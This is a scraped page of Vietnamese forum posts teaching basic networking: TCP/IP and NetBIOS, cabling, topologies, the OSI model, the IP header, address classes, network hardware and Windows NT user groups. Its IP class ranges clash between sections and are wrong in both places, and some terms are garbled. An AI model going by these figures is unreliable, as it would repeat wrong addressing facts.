mạng có thể gây ra những hậu quả không lường trước được.<br/><br/> +Giao thức mạng:<br/> khi cài đặt mớI Windows NT server các giao thức ngầm định là TCP/IP , IPX/SPX và NetBEUI.Các giao thức này có thể được loạI bỏ thêm vào hoặc cấu hình lạI bằng chgwờng trình network trong control panel chương trình này cũng có thể được dùng để tốI ưu hiệu suất của mạng bằng cách gắn kết mạng.<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/481.html#481,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">GIAO THỨC VÀ THIẾT BỊ TRUYỀN DẪN PROTOCOLS(GIAO THỨC)<br/><br/> 1.Ðịnh nghĩa<br/> Là những qui tắc qui địng cho việc giao tiếp giữa các máy,thiết bị với nhau.Nếu ko có giao thức thì các thiết bị không thể hiểu những tín hiệu được gửi đi từ một thiết bị khác và dữ liệu ko thể đi đến đích.<br/> 2.Giới thiệu về giao thức.<br/> Mỗi giao thức ứng với một công việc khác nhau như dịch dữ liệu ,gửi dữ liệu,kiểm tra lổi và địa chỉ.các giao thức này tương ứng với các tầng khác nhau trong chuẩn OSI có 3 loại giao thức.<br/> System protocol<br/> Application protocol<br/> Acces protocol.<br/><br/> a.TRANMISSION CONTROL PROTOCOL / INTERNET PROTOCOL(TCP / IP)<br/> Giao thức TCP /IP có thể chia làm 4 tầng(layer).Tương thích với 7 tầng của chuẩn OSI Model<br/> 1. Application layer:<br/> Tương thích với hai tầng application và presentation của chuẩn OSI những trình ứng dụng thông qua tầng này bằng những protocols như Winsock API, File Transfer protocol(FTP) ,Hypertext transfer protocol (HTTP),Dynamic configuration Protocol (DHCP)<br/> 2. Transport layer<br/> Tương ứng với 2 tầng session và transprort của chuẩn OSI Model tầng này có các giao thức TCPvà UDP.Chúng cung cấp các điều khiển luồng kiême tra lỗi.<br/> 3. Internet layer<br/> Tương ứng vớI tầng network của OSI tầng này nắm giữ IPvà ICMP, ARP nhữnggiao thức nắm thông tin tìm đường và sự phân giải địa chỉ của máy chủ.<br/> 4. Netword interface layer.<br/> Tương ứng với 2 tầng data link và physical của chuẩn OSI .Tầng này nắm giữ những định dang dữ liệu và truyền dữ liệu đến các cable<br/> TCP/IP là protocol được dùng để kết nối internet nó cũng có chức năng routerable nên dể dàng giao tiếp với các máy không dùng mạng thông qua một thiết bị là router.<br/> Địa chỉ TCP/IP là địa chỉ luận lý gồm 32 bit và được phân chia thành 4 nhóm mỗi nhóm chứa 8 bit trong mạng máy tính thì mỗi máy là một IP duy nhất.<br/> Địa chỉ IP được chia làm 3 lớp có dạng sau X.X.X.X<br/> Lơp A: Từ 0 đến 162 VD 1.0.135.126<br/> Lơp B Từ 128 đến 192<br/> Lớp C Từ 193đến 224 VD 192.168.0.224 thuộc lớp C<br/> Network basic input output system(netBIOS)<br/> Netbios là một giao thức, công nghệ nối mạng của Windows 9.x..Nó được thiết kế trong môi trường mạng LAN để chia sẻ tài nguyên (như dùng chung các File, Folder, máy in và nhiều tài nguyên khác....Mô hình này rất going mô hình mạng ngang hàng Peer to Peer). Nếu bạn nào hay đi chơi Games hay xài Internet ở ngoài hàng chắc không lạ gì mô hình này. Thông thường thì một mạng dùng giao thức Netbios thường là Netbios Datagram Service (Port 138), Netbios Session Service (Port 139) hoặc cả 2.<br/> Đây là giao thức tương đốI nhanh và hiệu quả vì nó sử dụng ít tài nguyên của mạng,giao thức này chỉ hổ trợ 254 kết nốI không hổ trợ bảo mật trong hệ thống mạng cũng không hổ trợ routerable.<br/> NETWORKING MEDIA(DÂY DẪN)<br/> Trong mạng máy tính ngườI ta thường sử dụng 2 loại cáp đó là cáp đồng trục(rất ít sử dụng vì khó tìm được đầu BNC T )và cáp xoắn đôi (UTP) là một loạI dây giống như dây điện thoại.<br/> Có 5 loạI cáp hay dùng là :<br/> UTP loai1 và 2<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">ùng truyền dữ liệu cấp độ thấp (dưới 4Mbs)<br/> UTP loạI 3 : Dùng truyền dữ liệu v ới tốc đ ộ l ên đ ến 16Mbs<br/> UTP lo ạI 4: Dùng truyền dữ liệu v ới tốc đ ộ l ên đ ến 20Mb<br/> UTP lo ạI 5: Dùng truyền dữ liệu v ới tốc đ ộ l ên đ ến 100Mb<br/> B ÀI SAU KI ẾN TR ÚC M ẠNG<br/> Kiến trúc mạng.<br/><br/> Mạng bus(bus topology)<br/> Chỉ gồm một Bus và tất cả các máy trong mạng được kểt nốI vào Bus này .Khi một máy cần phát tín hiệu cho một máy khác nó sẽ phát tín hiệu broadcast đến tất cả các máy .Nhựng chỉ máy nào mang địa chỉ đích mớI lấy được tín hiệu này .<br/> TạI 2 đầu của Bus phảI gẳn các terminator.Terminator dùng để ngừng tín hiệu truyền trên bus sau một khoảng thờI gian nhất định .nếu không có thiết bị này máy sẽ bị nghẽ mạch.<br/><br/> Mạng vòng (Ring topology)<br/> Trong mạng Ring mỗI máy được nốI vớI 2 máy gần nó nhất tạo thành một vòng tròn.Khi tín hiệu truyền từ máy gửI đến máy nhận tín hiệu đó sẽ đi qua các máy trung gian .Nếu máy trung gian không phảI là máy nhận tín hiệu thì nó tiếp tục truyền tín hiệu cho máy kế tiếp đến khi tín hiệu đến được máy nhận mớI thôi..Vì là mạng dạng vòng nên khi một máy bị trục trặc thì có thể mạng sẽ ngưng hoạt động .<br/><br/> Mạng hình sao(Star topology)<br/><br/> MỗI máy trên mạng được nốI qua một thiết bị như trung tâm ngư hup hay switch.Một khi cần truyền tín hiệu trước tiên tín hiệu đến Hup sau đó hup sẽ phát tín hiệu cho tất cả các máy trong mạng .<br/> Ưu điểm của hup là khi một máy bị hư thì tất cả các máy khác trong mạng vẫn hoạt động tốt .vì lý do đó mà hup được dùng phổ biến nhất hiện nay.<br/> Mạng lướI (Mesh topology)<br/> Cung cấp rất mhiều đường đi trong việc truyền dữ liệu giữa hai máy khi có một đường bị hư mesh sẽ dễ dàng thiết lập lạI đường mớI để dũ liệu đến được máy nhận.Một khó khăn nhất của mesh là giá thành vì phảI thiểt lập rất nhiều kết nốI<br/> Network transport systems<br/><br/> Network transport systems mô tả mốI quan hệ về mặt logic giữa các máy.<br/> Network transprort systems gồm hai loạI phổ biến là: Ethernet và Tokern Ring.trước khi tìm hiểu về network transprort systems chúng ta hãy nói về<br/><br/> switching.<br/> Switching là một thành phần của hình trạng mạng logic nó xác định kết nốI được tạo giữa các máy như thế nào .Có 3 loạI switching<br/> Circuit switching :<br/> Một kết nốI được thiết lập giữa 2 máy khi chúng băt đầu truyền dữ liệu.tất cả các dữ liệu sẽ đi theo một đường đã được chọn switching .Vì nó chiếm giữ đường truyền trong khi 2 máy vẫn còn đang kết nốI nên nó không phảI là phương phát tốt .Circuit switching được dùng trong ATM, ISDM và T1.<br/><br/> Message switching :<br/> Trong message switching trước tiên kết nốI được thiết lập giữa hai máy ,thông tin sẽ được truyền từ máy thứ nhất đến máy thứ hai,nếu không phảI là máy địh thì kết nốI sẽ huỷ bỏ và nó tiếp tục kết nốI cho đén máy đích thì thôi,nó truyền dữ liệu theo mọI hướng phương pháp này được dung trong email.<br/><br/> Packet switching:<br/> Trước khi được chuyển đi dữ liệu sẽ được chia nhỏ thành các gói tin (packet) các gói này có thể đi theo bất cứ con đường nào vì mỗI gói tin có chứa địa chỉ và số thứ tự mỗI gói nên nó sẽ tìn con đường nào gần nhất để đi .<br/> TạI máy nhận tất cả các gói tin sẽ được tập hợp theo đúng thứ tự . đây là phường pháp nhanh và hiệu quả trong việc truyền dữ liệu trên mạnh<br/> CSMA/CD là phương pháp mà tạI một thờI điểm chỉ có một máy gửI tín hiệu<br/> Ethernet dùng phương pháp truy suất CSMA/CD hay CSMA/CA sử dụng các loạI dây cáp xoắn đôi hay cáp đồng trục và dùng Fram để truyền dữ liệu<br/> BÀI SAU :CÁC THIẾT BỊ PHẦN CƯNG<br/> PROTOCOL IP<br/><br/> Protokol IP (Internet Protocol) là 1 phần của stek Ptotocol TCP/IP, TCP/IP được chia làm 4 tầng như các bạn đã biết ở trên :<br/> 1. Aplication<br/> 2.TCP-protocol<br/> 3.IP-protocol<br/> 4.Địa chỉ mạng (address Network)<br/> IP-Protocol được thiết lập để truyền dữ liệu qua lại trong mạng Internet. IP-pro chứa địa chỉ thông tin và điều khiển thông tin, cho phép truyền các Paket(gói dữ liệu) theo một hành trình nhất định. Paket được xác định như là nhóm đơn vị logic, chứa header (phần đầu)-chứa thông tin điều khiển và những dữ liệu người dùng. Khi thiết bị gặp những gói tin này,nó sẽ chia packet ra 2 phần : header và phần xử lý thông tin về tiến trình. header được xử lý nhỏ hơn, sau đó những paket này được hợp lại và được truyền đi tiếp theo.<br/> Một đặc điểm của IP-pro là nó rất đơn giản và hiệu qủa để truyền datagram qua Internet. Datagram là một nhóm thông tin logic, được truyền đi trong môi trường mạng, và nó cũng là 1 element của tầng mạng (Layer Internet).<br/> Cấu trúc của một IP-paket<br/> +-------------4-------------------8---------------16-------19---------24-----------31+<br/> | Version | độ dài header | dạng thức | tổng độ dài của paket (Bytes)<br/> +------------------------------------------------------------------------------------------+<br/> | Identification | flag | Flagment offset<br/> +------------------------------------------------------------------------------------------<br/> | time to live | Protocol | header checksum<br/> +------------------------------------------------------------------------------------------<br/> | Source adress<br/> +------------------------------------------------------------------------------------------<br/> | Destination adress<br/> +------------------------------------------------------------------------------------------<br/> | Parametra<br/> +------------------------------------------------------------------------------------------<br/> | Thông tin<br/> +------------------------------------------------------------------------------------------<br/><br/> *version :version hien tại của IP-pro<br/> *độ dài header : độ dài của header<br/> *dạng thức : cách thức truyền datagram , như TCP, UDP ưu tiên<br/> *Tổng độ dài của paket : chắc mình không cần giải thích nữa<br/> *Identification : là một số nguyên, được dùng để sắp xếp các datagram từ các Frame<br/> *Flag : là một trường 3 bit (bit = 0 hoặc 1), bit đầu tiên xác định pasket đã được chia nhỏ thành các frame chưa , bit thứ 2 chỉ ra paket có phải là paket cuối cùng không. bit thứ 3 vào thời điểm này chưa được sử dụng<br/> *flagment offset : trộn đảo, sắp xếp các Frame với paket tương ứng. phần này dùng để kiểm tra (test) Frames<br/> *time to live : giá trị này được giảm đi 1 đơn vị sau mỗi lần được xụ lý tại một hops, giảm cho dến 0 thì paket hết nhiệm vụ (bi phá huỷ)<br/> *Protocol : cho biết loại Protocol nào sẽ ưu tiên nhận paket<br/> *header checksum : kiểm tra sự toàn vẹn của header paket.<br/> *Source Paket : Địa chỉ nguồn<br/> *Destination paket : Địa chỉ đích<br/> *Parametr : Thường chứa nhũng parametr (tham số) về bảo mật, an toàn,.<br/> *Thông tin : Thông tin cao hơn , thường la` "No option"<br/><br/> Ví dụ : ping-test<br/> -------IP Header-------------<br/> IP:<br/> IP: Version =4. header length =20 bytes<br/> IP: Type of service = 00<br/> IP: 000. .... = routine<br/> IP: ...0 .... = normal delay<br/> IP: ....0 .... = normal throughput<br/> IP: .... .0.. = normal reliability<br/> IP: Total length = 60 bytes<br/> IP: Identification = 59136<br/> IP: Flags = 0X<br/> IP: .0.. .... = may fragment<br/> IP: ..0. .... = last fragment<br/> IP: Fragment offset= 0 bytes<br/> IP: Time to live = 32 seconds/hops<br/> IP: Protocol =1 (ICMP)<br/> IP: Header checksum = 0376<br/> IP: Source adress = [172.29.44.14]<br/> IP: Destination address =[172.29.44.2]<br/> IP: No options<br/> ---------------------------------<br/> Địa chỉ IP<br/><br/> Địa chỉ IP là duy nhất khi bạn vào mạng. Tổ chức InterNIC (InterNetwork Information Center) chia địa chỉ IP thành 3 lớp : A,B,C tương ứng với 32 bit. Theo mặc định thì địa chỉ Internet của lớp A là 8 bit, B là 16 bit, C là 24 bit<br/> Mình không biết tiếng Việt dịch chuẩn là thế nào, ở đây mình nói thế này nhé IP : 192.168.10.1<br/> 192 ---&gt; địa chỉ Internet đầu tiến (ký hiệu là X hén)<br/> 168.10.1 ---&gt; địa chỉ mạng (ký hiệu là Y hén)<br/><br/> Bảng phân lớp IP-adress :<br/> ----------------------------------------------------------------------------------------<br/> Lớp-----X----------phân vùng-----------------------------------Mask<br/> ----------------------------------------------------------------------------------------<br/> A 1-125 X.Y.Y.Y 1111 1111 0000 0000 0000 0000 0000 0000 hay 255.0.0.0<br/><br/> B 126-191 X.X.Y.Y 1111 1111 1111 1111 0000 0000 0000 0000 HAY 255.255.0.0<br/><br/> C 192-223 X.X.X.Y 1111 1111 1111 1111 1111 1111 0000 0000 hay 255.255.255.0<br/><br/> D Dành cho những nhóm gửi Messages, không sủ dụng cho những chức năng khác<br/><br/> E thuộc về thực nghiệm, và không được sử dụng cho những chức năng thông thường<br/><br/> ví dụ : địa chỉ 206.0.125.0 số dầu tiên 206 thuộc khoảng 192-223 --&gt; thuộc lớp C , mask 255.255.255.0. Điều này có nghĩa là chúng ta có 8 bit cho địa chỉ mạng (Y).<br/> ------------------------------------------------------------------------------------<br/> bit--------------------1--------2-----------3--4---5---6---7---8<br/><br/> giatri----------------128-----64---------32-16--8--4---2----1 = 255<br/> ------------------------------------------------------------------------------------<br/><br/> Trong ví dụ này chúng ta chỉ có 254 địa chỉ mà thôi; 0 và 255 không sử dụng được, vì 0 là địa chỉ Internet, và 255-dùng cho địa chỉ phát thanh,...<br/><br/> CÁC THIẾT BỊ PHẦN CỨNG.<br/><br/> Netword interface card(NICs)<br/> Một network adapter card, tức bảng mạch điều hợp mạng, (đôi khi gọi là network interface card hay vắn tắt là NIC) là một bảng mạch phần cứng được cài đặt trong máy tính của bạn để cho phép máy tính hoạt động được trên mạng. Network adapter card cung cấp một (hoặc nhiều) cổng để cho cáp mạng được nối vào về mặt vật lý, và về mặt vật lý bảng mạch đó sẽ truyền dữ liệu từ máy tính tới cáp mạng và theo chiều ngược lại.<br/> Mỗi máy tính trong mạng cần phải có một trình điều khiển (driver) cho network adapter card, đó là một chương trình phần mềm kiểm soát bảng mạch mạng. Mỗi trình điều khiển của network adapter card được cấu hình cụ thể để chạy với một kiểu bảng mạch mạng (network card) nhất định.<br/> Cùng với các bảng mạch mạng và trình điều khiển bảng mạch mạng, một máy tính mạng cũng cần phải có một trình điều khiển giao thức (protocol driver) mà đôi khi gọi là một giao thức giao vận hay chỉ vắn tắt là giao thức. Trình điều khiển giao thức thực hiện công việc giữa phần mềm mạng ở mức trên (giống như trạm làm việc và máy chủ) và network adapter card. Giao thức đóng gói dữ liệu cần gửi đi trên mạng theo cách mà máy tính ở nơi nhận có thể hiểu được.<br/> Qui trình kết hợp một trình điều khiển giao thức với network adapter card tương ứng, và thiết lập một kênh truyền thông giữa hai thứ đó gọi là kết gắn (binding).<br/> Để hai máy tính truyền thông với nhau trên một mạng, chúng phải dùng cùng một giao thức. Đôi khi một máy tính được cấu hình để dùng nhiều giao thức. Trong trường hợp này, hai máy tính chỉ cần một giao thức chung là có thể truyền thông với nhau.<br/> Trong một số mạng, mỗi trình điều khiển network adapter card và giao thức của máy tính là một phần mềm riêng. Trong một số mạng khác thì chỉ một phần mềm gọi là monolithic protocol stack thực hiện các chức năng của cả trình điều khiển network adapter card và giao thức<br/><br/> Repeater<br/> Là thiết bị dùng để khuyết đạI tín hiệu chỉ có một ngõ vào và một ngõ ra khi cần một khoảng cách vượt quá một segment ta sẽ dùng thiết bị này để kết nốI các đoạn mạng lạI vớI nhau nhưng phảI tuân thưr theo qui tắc 5-4-3 . Đây là thiết bị chỉ thích hợp vói mạng Bus.<br/><br/> Hup<br/> Là một repeater có nhiều cổng ,một cổng được kết nốI vào backbone các cổng còn lạI kết nốI vớI các máy .<br/> Một số các cổng của hup như:<br/> Posts:tuỳ theo từng loạI mà ta có 4 hay 24 posts,…..<br/> Uplink port<img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">ùng để kết nốI các huo lạI vói nhau.<br/> Post for management console:có thể dùng để kết nốI vớI các may laptop.<br/> Backbone port:NốI hup vớI bãckbone.<br/><br/> a.Standalone Hup:<br/> là hup được dùng cho các máy workgroup chúng có thể được kết nốI vớI các hup bằng các loạI cáp.<br/> Standalon chỉ thích hợp cho các công ty cỡ nhỏ ,các phong lap.<br/><br/> b.Modular Hup:<br/> Có chứa một system board và các khe cắm nên chúng ta dể đàng cắm các bộ điều hợp vào ,có thể kết nốI vớI các loạI hup khác như router, wan…..ngoài ra nó còn cung cấp các slots mơ rộng khác .<br/><br/> c.Intelligent hup:<br/> Đây là loạI Hup có khả năng xử lý dữ liệu giám sát đường truyền,chúng có thể quản lý từ bất cứ đâu trên mạng,nó có khả năng phân tích dữ liệu ,lưu trữ các thông tin phát sinh bởI hup này trong MIB(MIB là tập hợp dữ liệu được dùng bởI chương trình quản lý )<br/><br/> Bridge<br/> Là thiết bị trông giống repeater gồm một cổng input và một cổng output,nó thuộc tầng Data link của OSI .trước khi truyền dữ liệu nó sẽ phân tích địa chỉ đích để quyết định xem có cho dữ liệu đi qua đoạn mạng khác hay không ?.<br/> Nếu nó thấy địa chỉ đích nằm trên một đoạn mạng thì nó sẽ ngăn ko cho data di qua đoạn mạng khác,ngược lạI nó sẽ cho data đi qua để đến được địa chỉ cần nhận data.<br/><br/> Switch<br/> Switch giống như Bridge nhưng nó có nhiều Ports mỗI Ports trên một Switch nhưng hoạt động tương tự như bridge<br/> Switch chia nhỏ mạng của chúng ta thành các nhóm mạng nhỏ hơn không giống như hup , Switch hoạt động tạI tầng data link .Vì nhiều Ports nên Switch sử dụng hiệu quả hơn do dó giá thành cao hơn .<br/> Ưu điểm :<br/> Thứ nhất : Switch rất bảo mật vì mỗI đường truyền được tách riêng ra<br/> Thứ hai: Switch cung cấp các kênh khác nhau cho các thiết bị<br/><br/> Router<br/> Router là một thiết bị gồm nhiều Ports có thể kết nốI được vói các mạng LAN, WAN không đồng bộ về tốc độ truyền,giao thức.<br/> Router hoạt động ơ tầng network của chuẩn OSI đây là thiết bị rất đắc của Cisco mỗI Router có một tính năng như:<br/> +Nó có thể xác định đường truyền ngắn nhất nhanh nhẩt giữa hai máy .<br/> +Tìm đường khác để đi khi đường chính bị hư .<br/> +Hỗ trợ nhiều kết nốI một lúc ,giám sat đừơng truyền ,báo cáo và thống kê<br/> +Chuẩn đoán các vấn đề về lỗI kết nốI và kích hoạt chuông báo<br/> +Ngăn tín hiệu broadcast.<br/><br/> Gateway<br/> Gateway là một thiết bị được kết hợp giữa phần cứng và phần mềm . Gateway có thể được dùng để nốI hai hệ thống không đồng bộ vớI nhau để một hê thống khác có thể đọc được thông tin , Gateway sẽ gói thông tin đó lạI .Nó phỉa giao tiếp vớI một chương trình ứng dụng thiểt lập và quản ly các phiên làm việc ,dịch dữ liệu được mã hoá .<br/> Bài sau :Tổng quan về Winnt<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/480.html#480,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">PHÂN LOẠI MẠNG MÁY TÍNH.<br/> Có 2 loại :<br/> Mạng cục bộ(còn gọi là mạng LAN local area netword)<br/> Là các mạng được cài đặc trong phạm vi tương đối nhỏ khoảng cách các nút mạng khoảng vài Km ví dụ là mạng trong một phòng,trong một trường học..<br/> Mạng điện rộng(WAN:Wide area netword)<br/> Phạm vi của mạng có thể là một quốc gia thậm chí cả lục địa.Ngoài ra còn nhiều mạng nữa vi dụ mạng MAN,GAN.<br/> Các chuẩn của mạng và mô hình OSI<br/> Chuẩn là nền tảng mà nhà sản xuất phải dựa vào để đảm bảo sản phẩm hay thiết bị mà họ làm ra phải tuong thích với nhau.<br/> Hiện nay có rất nhiều chuẩn trong thế giới mạng chuẩn quan trọng nhất là chuẩn OSI<br/> Chuẩn OSI(Internatiol standards irntitute)<br/> Là những tổ chức chuẩn của 130 quốc gia chuẩn này được áp đụng trong khoa học,kỹ thuật và kinh tế.<br/> Trong tin học chuẩn này đựơc áp đặt trong 7 tuần của mạng và chúng ta biết đó là OSI model.<br/> 1. Application<br/> 2. Presentation<br/> 3. Session<br/> 4. transport<br/> 5. Netword<br/> 6. Data link<br/> 7. Physical<br/> Mỗi tầng có những chức năng riêng và tương tác trực tiếp với nhau.<br/> Tầng Vật Lý (Physical Layer) có trách nhiệm chuyển các bit từ một máy tính tới một tính khác, và nó quyết định việc truyền một luồng bit trên một phương tiện vật lý. Tầng này định nghĩa cách gắn cáp vào một bảng mạch điều hợp mạng (network adapter card) và kỹ thuật truyền dùng để gửi dữ liệu qua cáp đó. Nó định nghĩa việc đồng bộ và kiểm tra các bit.<br/> Tầng Liên Kết Dữ Liệu (Data Link Layer) đóng gói thô cho các bit từ tầng vật lý thành các frame (khung). Một frame là một gói tin logic, có cấu trúc trong đó có chứa dữ liệu. Tầng Liên Kết Dữ Liệu có trách nhiệm truyền các frame giữa các máy tính, mà không có lỗi. Sau khi Tầng Liên Kết Dữ Liệu gửi đi một frame, nó đợi một xác nhận (acknowledgement) từ máy tính nhận frame đó. Các frame không được xác nhận sẽ được gửi lại.<br/> Tầng Mạng (Network Layer) đánh địa chỉ các thông điệp và chuyển đổi các địa chỉ và các tên logic thành các địa chỉ vật lý. Nó cũng xác định con đường trong mạng từ máy tính nguồn tới máy tính đích, và quản lý các vấn đề giao thông, như chuyển mạch, chọn đường, và kiểm soát sự tắc nghẽn của các gói dữ liệu.<br/> Tầng Giao Vận (Transport Layer) quan tâm tới việc phát hiện lỗi và phục hồi lỗi, đảm bảo phân phát các thông điệp một các tin cậy. Nó cũng tái đóng gói các thông điệp khi cần thiết bằng cách chia các thông điệp dài thành các gói tin nhỏ để truyền đi, và ở nơi nhận nó sẽ xây dựng lại từ các gói tin nhỏ thành thông điệp ban đầu. Tầng Giao Vận cũng gửi một xác nhận về việc nhận của nó.<br/> Tầng Phiên (Session Layer) cho phép hai ứng dụng trên 2 máy tính khác nhau thiết lập, dùng, và kết thúc một phiên làm việc (session). Tầng này thiết lập sự kiểm soát hội thoại giữa hai máy tính trong một phiên làm việc, qui định phía nào sẽ truyền, khi nào và trong bao lâu.<br/> Tầng Trình Diễn (Presentation Layer) chuyển đổi dữ liệu từ Tầng ứng Dụng theo một khuôn dạng trung gian. Tầng này cũng quản lý các yêu cầu bảo mật bằng cách cung cấp các dịch vụ như mã hóa dữ liệu, và nén dữ liệu sao cho cần ít bit hơn để truyền trên mạng.<br/> Tầng ứng Dụng (Application Layer) là mức mà ở đó các ứng dụng của người dùng cuối có thể truy nhập vào các dịch vụ của mạng.<br/> Khi hai máy tính truyền thông với nhau trên một mạng, phần mềm ở mỗi tầng trên một máy tính giả sử rằng nó đang truyền thông với cùng một tầng trên máy tính kia. Ví dụ, Tầng Giao Vận của một máy tính truyền thông với Tầng Giao Vận trên máy tính kia. Tầng Giao Vận trên máy tính thứ nhất không cần để ý tới truyền thông thực sự truyền qua các tầng thấp hơn của máy tính thứ nhất, truyền qua phương tiện vật lý, và sau đó đi lên tới các tầng thấp hơn của máy tính thứ hai.<br/> Mô Hình Tham Chiếu OSI là một ý tưởng về công nghệ mạng, và một số ít hệ thống tuân thủ theo nó, nhưng mô hình này được dùng để thảo luận và so sánh các mạng với nhau.<br/> Sự giao tiếp giữa hai máy xảy ra như sau:<br/> Giả sử bạn bắt đầu chương trình gửi mail vào thời điểm này tầnh Application đã nhận biết được sự chọn lựa của bạn và chuyển xuống tầng Presentation.<br/> Presentation quyết định định dạng hay mã hoá dữ liệu nhận được từ tầng application.<br/> Sau đó chuyển xuống tiếp tầng session tại đây dữ liệu được gán mpptj control fram đặc biệt cho biết la co thể chuyển data xuống tầng tranport<br/> Tại tầng tranport data dc gom lại thành các fram tại tầng data link nếu dữ liệu quá lớn tầng này sẽ phân chia thành những gói nhỏ và đánh thứ tự cho những gói đó và truyền xuống tầng netword<br/> Tầng này thêm những thông tin địa chỉ vào gói dữ liệu mà nói nhận được và chuyển xuống chính xác cho tầng data link .tai đây dữ liệu đươc chuyển thành các bít đưa xuống cable và truyền sang máy B<br/> Máy B nhận dư liệu và dịch ngược từ tầng<br/> Physical<br/> Data link<br/> Netword<br/> transport<br/> Session<br/> Presentation<br/> Application<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.html">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/130.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/130/479.html#479,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><font size='+3'><b>Phần II - QUẢN LÝ NGƯỜI DÙNG </b></font><br/><br/> <b>I. Account người dùng và nhóm trong Windows NT</b><br/> Một account người dùng bao gồm thông tin về một người dùng như:<br/> - Tên người dùng<br/> - Tên đầy đủ<br/> - Mật khẩu<br/> - Quyền trên hệ thống<br/> Để có thể nhập hệ thống Windows NT phải cần ít nhất một account. Một account gán cho một người dùng nhất định một tập các quyền, định nghĩa cách thức họ có thể sử dụng hệ thống.<br/> Một nhóm là một tên, tương tự với tên người dùng hoặc account người dùng, có thể được sử dụng để tham chiếu tới nhiều người dùng. Mục đích là để làm thuận tiện việc cung cấp và kiểm soát truy cập tới nhiều người dùng cùng có một nhiệm vụ tương tự. Bằng cách đặt các người dùng vào một nhóm, bạn có thể dễ dàng cung cấp cho các người dùng trong nhóm đó cùng khả năng hoặc hạn chế nhất định. Nếu bạn cần thay đổi quyền gán cho các người dùng trong nhóm, bạn chỉ việc sửa đổi một account - group account.<br/> --------------------------------------------------------------------------------<br/> <b>II. Nhóm cục bộ (local groups) </b><br/> Đối với Windows NT, chỉ một kiểu nhóm có thể được tạo và bảo trì - nhóm cục bộ. Một nhóm cục bộ chỉ có thể được cung cấp quyền trong hệ thống của nó. Tuy nhiên, nếu hệ thống lại là một phần của một domain thì nhóm cục bộ có thể chứa account của người dùng từ domain hoặc các domain được tin cậy bất kỳ.<br/> Không thể gán quyền truy nhập tài nguyên trên \\workstation_1 cho một nhóm cục bộ định nghĩa trên \\server_2.<br/> Trong một domain, khi một nhóm cục bộ định nghĩa trong PDC nó được chép tự động sang các BDC khi dữ liệu các accounts được nhân bản. Nó được xác định trong dữ liệu tất cả các domain controllers (bao gồm PDC, các BDCs) trong domain đó. Nhóm cục bộ được gán quyền tới các tài nguyên của bất cứ domain contronllers nào trong domain.<br/> Trong một môi trường workgroup, một thành viên trong nhóm cục bộ chỉ có thể gồm một account người dùng từ dữ liệu account trong máy tính đó.<br/> Một nhóm cục bộ trong Windows NT Workstation và Windows NT Server gồm :<br/> - Các account người dùng của máy tính cục bộ<br/> - Các người dùng và các nhóm tổng thể (global group) của domain máy tính cục bộ<br/> - Các người dùng và các nhóm tổng thể từ các domains được thừa quyền (hay còn gọi là "tin cậy"-trusted) bởi domain cục bộ<br/> Chú ý: Để dễ quản lý chúng ta sử dụng nhiều tới nhóm cục bộ<br/><br/> Các nhóm cục bộ bổ trợ thiết lập trước<br/> Có một vài nhóm bổ trợ có sẵn trong các domain controllers Windows NT Server:<br/> - Server Operators: Đảm trách cho mạng các domain controllers hoạt động. Các thành viên nhóm này có cùng quyền hạn như Administrator, ngoại trừ nó không thể quản lý bảo mật trong server. Nó chỉ có thể cho phép dùng chung hay bỏ dùng chung các tài nguyên của domain controllers, khoá hay mở khoá một domain controller, và tạo khuôn dạng (format) các đĩa của domain controllers. Nó cũng có quyền tại các domain controllers như sao lưu (back up) và lưu trữ tệp, shut down (tắt) một domain controller.<br/> - Account Operators: Có thể quản lý các account nhóm hay người dùng của domain. Nó có thể tạo, xoá, sửa hầu hết các người dùng, nhóm tổng thể, và nhóm cục bộ. Nó không thể sửa các account người dùng dạng Administrator, hoặc các nhóm cục bộ như nhóm Administrators, Server Operators, Account Operators, Print Operstors, Backup Operators. Và nó cũng không thể gán quyền người dùng.<br/> - Print Operators: Có thể chia xẻ hay ngừng chia xẻ các máy in, quản lý các máy tin trong domain controllers. Nó có thể truy nhập 